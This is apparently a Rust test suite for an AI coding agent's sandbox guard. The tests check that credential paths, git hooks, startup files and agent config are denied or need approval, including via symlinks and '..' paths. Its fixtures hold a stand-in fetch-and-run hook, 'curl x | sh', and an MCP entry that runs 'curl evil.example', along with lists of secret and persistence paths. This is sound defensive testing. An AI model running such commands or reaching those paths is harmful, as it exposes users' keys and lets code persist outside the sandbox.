//! Wave H lane `harden`: the file tools obey the sandbox's deny-list (pre-flight B3), the
//! project files that run outside the sandbox ask or are refused (B4 b/c), and trusted project
//! files load only as the user approved their content (B4 a).
//! Isolation: every path lives under `oxa_fake::TestEnv`.

use oxa_fake::TestEnv;
use oxa_perm::{deny_reasons, Approval, ModePolicy, PathGuard, TrustStore, APPROVED_KEY};
use oxa_proto::{Access, Decision, Mode, Policy};
use std::path::PathBuf;

fn guarded(env: &TestEnv) -> ModePolicy {
    ModePolicy::new().with_guard(PathGuard::new(
        &env.home(),
        &env.agent_dir(),
        &env.agent_dir().join("tmp"),
    ))
}

const SENSITIVE: Decision = Decision::Deny(deny_reasons::SENSITIVE);

#[test]
fn denied_paths_are_refused_in_every_mode_and_through_every_door() {
    let env = TestEnv::new();
    env.write("home/.ssh/id_test", "KEY");
    env.write("home/.oxa/agent/trust.json", "{}");
    let key = env.home().join(".ssh/id_test");
    let mut p = guarded(&env);
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        for a in [Access::Read(key.clone()), Access::Write(key.clone())] {
            assert_eq!(p.decide(mode, &a, &env.work()), SENSITIVE, "{mode:?} {a:?}");
        }
    }
    // The deny-list beats the cwd (oxa started in $HOME) and a remembered grant.
    p.remember(&Access::Read(env.home().join(".ssh/other")));
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(key.clone()), &env.home()),
        SENSITIVE
    );
    // `..` from the project, and a symlink in the project, both land in a denied path.
    let dotdot = env.work().join("../home/.ssh/id_test");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(dotdot), &env.work()),
        SENSITIVE
    );
    std::os::unix::fs::symlink(env.home().join(".ssh"), env.work().join("keys")).expect("symlink");
    let via_link = env.work().join("keys/id_test");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(via_link.clone()), &env.work()),
        SENSITIVE
    );
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(via_link), &env.work()),
        SENSITIVE
    );
    // A relative path is taken from the cwd.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(PathBuf::from("keys/id_test")),
            &env.work()
        ),
        SENSITIVE
    );
    // The agent directory is denied, its spill files (`tmp`) are not.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(env.agent_dir().join("trust.json")),
            &env.work()
        ),
        SENSITIVE
    );
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(env.agent_dir().join("tmp/s1/out.txt")),
            &env.work()
        ),
        Decision::Ask,
        "a spill file reads as before (outside the cwd: ask)"
    );
    // A plain file of the project is unaffected.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Write(env.work().join("a.txt")),
            &env.work()
        ),
        Decision::Allow
    );
}

#[test]
fn protected_project_files_ask_or_are_refused() {
    let env = TestEnv::new();
    let cwd = env.work();
    let mut p = guarded(&env);
    for rel in [
        ".oxa/mcp.json",
        ".oxa/settings.json",
        ".oxa/extensions/x.ts",
        ".agents/skills/s/SKILL.md",
    ] {
        let a = Access::Write(cwd.join(rel));
        assert_eq!(p.decide(Mode::Workspace, &a, &cwd), Decision::Ask, "{rel}");
        assert_eq!(p.decide(Mode::Ask, &a, &cwd), Decision::Ask, "{rel}");
        assert_eq!(
            p.decide(Mode::Plan, &a, &cwd),
            Decision::Deny(deny_reasons::PLAN_WRITE),
            "{rel}"
        );
        // A remembered grant does not turn these into Allow: every write asks.
        p.remember(&a);
        assert_eq!(
            p.decide(Mode::Workspace, &a, &cwd),
            Decision::Ask,
            "{rel} after a grant"
        );
        // Reading them is unchanged.
        assert_eq!(
            p.decide(Mode::Workspace, &Access::Read(cwd.join(rel)), &cwd),
            Decision::Allow
        );
    }
    for rel in [".git/hooks/pre-commit", ".git/config"] {
        let a = Access::Write(cwd.join(rel));
        for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
            assert_eq!(
                p.decide(mode, &a, &cwd),
                Decision::Deny(deny_reasons::GIT_PROTECTED),
                "{rel} {mode:?}"
            );
        }
    }
    // `..` into the protected directory from a subdirectory is the same file.
    let sneaky = cwd.join("src/../.git/hooks/post-checkout");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(sneaky), &cwd),
        Decision::Deny(deny_reasons::GIT_PROTECTED)
    );
    // A symlink in the project pointing into .git/hooks too.
    std::fs::create_dir_all(cwd.join(".git/hooks")).unwrap();
    std::os::unix::fs::symlink(cwd.join(".git/hooks"), cwd.join("h")).unwrap();
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(cwd.join("h/pre-push")), &cwd),
        Decision::Deny(deny_reasons::GIT_PROTECTED)
    );
}

#[test]
fn approval_follows_the_content() {
    let env = TestEnv::new();
    let cwd = env.work();
    let file = env.agent_dir().join("trust.json");
    env.write(
        "work/.oxa/mcp.json",
        r#"{"mcpServers":{"a":{"command":"echo","args":["one"]}}}"#,
    );
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"dark","hooks":{"session_start":"true"}}"#,
    );
    let mut store = TrustStore::load(&file);
    store.save(&file, &cwd, true).unwrap();
    assert_eq!(store.approval(&cwd), Approval::NoRecord);
    assert!(
        store.trusted_as_approved(&cwd),
        "no record yet: the saved decision decides"
    );
    store.approve(&file, &cwd).unwrap();
    assert_eq!(TrustStore::load(&file).approval(&cwd), Approval::Matches);

    // A setting that runs nothing changes nothing.
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"light","hooks":{"session_start":"true"}}"#,
    );
    assert_eq!(TrustStore::load(&file).approval(&cwd), Approval::Matches);

    // The model rewrites mcp.json and adds an extension.
    env.write(
        "work/.oxa/mcp.json",
        r#"{"mcpServers":{"a":{"command":"curl","args":["evil.example"]}}}"#,
    );
    env.write("work/.oxa/extensions/new.js", "export default function () {}");
    let store = TrustStore::load(&file);
    let Approval::Changed(changed) = store.approval(&cwd) else {
        panic!("a changed file needs a new approval");
    };
    let lines: Vec<String> = changed.iter().map(|c| c.line()).collect();
    assert_eq!(changed.len(), 2, "{lines:?}");
    assert!(
        lines
            .iter()
            .any(|l| l.contains("mcp.json (changed: MCP servers a: runs `curl evil.example`)")),
        "{lines:?}"
    );
    assert!(
        lines.iter().any(|l| l.contains("new.js (new: extension code")),
        "{lines:?}"
    );
    assert!(!store.trusted_as_approved(&cwd));

    // A changed hook command needs approval too.
    let mut store = store;
    store.approve(&file, &cwd).unwrap();
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"light","hooks":{"session_start":"curl x | sh"}}"#,
    );
    assert!(matches!(
        TrustStore::load(&file).approval(&cwd),
        Approval::Changed(_)
    ));

    // The file stays pi's map of directories (the record under its own key), and a later
    // decision keeps the record.
    let text = std::fs::read_to_string(&file).unwrap();
    let v: serde_json::Value = serde_json::from_str(&text).unwrap();
    assert!(v.get(APPROVED_KEY).is_some_and(|x| x.is_object()), "{text}");
    let mut store = TrustStore::load(&file);
    store.save(&file, &env.root().join("other"), false).unwrap();
    let v: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&file).unwrap()).unwrap();
    assert!(v.get(APPROVED_KEY).is_some(), "save keeps the approvals");
    assert_eq!(TrustStore::load(&file).lookup(&cwd), Some(true));
}

/// O-199: with oxa started in `$HOME` (a home workspace), the file tools still ask before
/// writing what runs or configures something outside the sandbox later (shell startup files,
/// `~/.local/bin`, `~/.config/systemd`, `~/.oxa`, ...), also under YOLO; the home's folders
/// are the workspace. Keys stay denied.
#[test]
fn started_in_home_the_startup_files_ask_and_the_folders_are_the_workspace() {
    let env = TestEnv::new();
    env.write("home/.bashrc", "# rc\n");
    env.write("home/project/keep", "");
    env.write("home/.config/systemd/user/a.service", "");
    let home = env.home();
    let switch = oxa_proto::YoloSwitch::new(true);
    for p in [guarded(&env), guarded(&env).with_yolo(switch)] {
        for rel in [
            ".bashrc",
            ".profile",
            ".bash_profile",
            ".zshrc",
            ".local/bin/tool",
            ".local/share/applications/a.desktop",
            ".config/systemd/user/a.service",
            ".config/autostart/a.desktop",
            ".config/hypr/hyprland.conf",
            ".oxa/settings.json",
            ".claude/settings.json",
            ".codex/config.toml",
            ".dsh/profiles/x",
            "bin/tool",
        ] {
            let a = Access::Write(home.join(rel));
            assert_eq!(p.decide(Mode::Workspace, &a, &home), Decision::Ask, "{rel}");
            assert_eq!(
                p.decide(Mode::Plan, &a, &home),
                Decision::Deny(deny_reasons::PLAN_WRITE),
                "{rel}"
            );
        }
        let a = Access::Write(home.join("project/x"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), Decision::Allow);
        let a = Access::Write(home.join(".ssh/authorized_keys"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), SENSITIVE);
        let a = Access::Read(home.join(".codex/auth.json"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), SENSITIVE);
    }
    // A project of its own under `~/.config` is still the user's workspace there.
    let p = guarded(&env);
    let nvim = home.join(".config/nvim");
    std::fs::create_dir_all(&nvim).unwrap();
    let a = Access::Write(nvim.join("init.lua"));
    assert_eq!(p.decide(Mode::Workspace, &a, &nvim), Decision::Allow);
}

#[test]
fn the_real_account_home_is_denied_as_well_as_a_changed_home() {
    let env = TestEnv::new();
    // `real` stands for the passwd home; `$HOME` points elsewhere (env.home()).
    let real = env.work().join("real-account-home");
    for rel in [
        ".ssh/id_synth",
        ".aws/credentials",
        ".config/gh/hosts.yml",
        ".gnupg/k",
    ] {
        env.write(&format!("work/real-account-home/{rel}"), "SYNTH");
    }
    let guard = PathGuard::with_real_home(
        &env.home(),
        Some(&real),
        &env.agent_dir(),
        &env.agent_dir().join("tmp"),
    );
    let p = ModePolicy::new().with_guard(guard);
    for home in [env.home(), real.clone()] {
        for rel in [".ssh/id_synth", ".aws/credentials", ".gnupg/k"] {
            for a in [Access::Read(home.join(rel)), Access::Write(home.join(rel))] {
                assert_eq!(p.decide(Mode::Workspace, &a, &env.work()), SENSITIVE, "{a:?}");
            }
        }
    }
}

#[test]
fn git_worktree_common_dir_hooks_and_config_are_never_written() {
    let env = TestEnv::new();
    let main = env.work().join("main");
    let wt = env.work().join("wt");
    let wtgit = main.join(".git/worktrees/wt");
    std::fs::create_dir_all(main.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(&wtgit).unwrap();
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::write(wt.join(".git"), format!("gitdir: {}\n", wtgit.display())).unwrap();
    std::fs::write(wtgit.join("commondir"), "../..\n").unwrap();
    let p = guarded(&env);
    for f in [
        main.join(".git/hooks/pre-commit"),
        main.join(".git/config"),
        wtgit.join("config.worktree"),
        wtgit.join("hooks/pre-push"),
    ] {
        for mode in [Mode::Workspace, Mode::Ask] {
            assert_eq!(
                p.decide(mode, &Access::Write(f.clone()), &wt),
                Decision::Deny(deny_reasons::GIT_PROTECTED),
                "{f:?} {mode:?}"
            );
        }
    }
    // Ordinary work in the worktree is unchanged.
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(wt.join("src/a.rs")), &wt),
        Decision::Allow
    );
}
